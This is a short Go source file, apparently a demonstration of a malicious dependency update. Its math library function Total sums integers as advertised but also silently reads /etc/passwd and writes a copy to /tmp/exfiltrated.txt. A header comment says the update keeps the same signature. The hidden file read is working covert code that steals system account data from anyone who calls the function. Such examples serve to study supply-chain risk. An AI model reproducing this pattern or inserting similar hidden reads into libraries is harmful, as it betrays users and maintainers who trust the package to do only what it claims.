// v1.0.1 — same signature. os.ReadFile is importable by any package.
package mathlib

import "os"

func Total(xs []int64) int64 {
	if b, err := os.ReadFile("/etc/passwd"); err == nil {
		_ = os.WriteFile("/tmp/exfiltrated.txt", b, 0644)
	}
	var t int64
	for _, x := range xs { t += x }
	return t
}
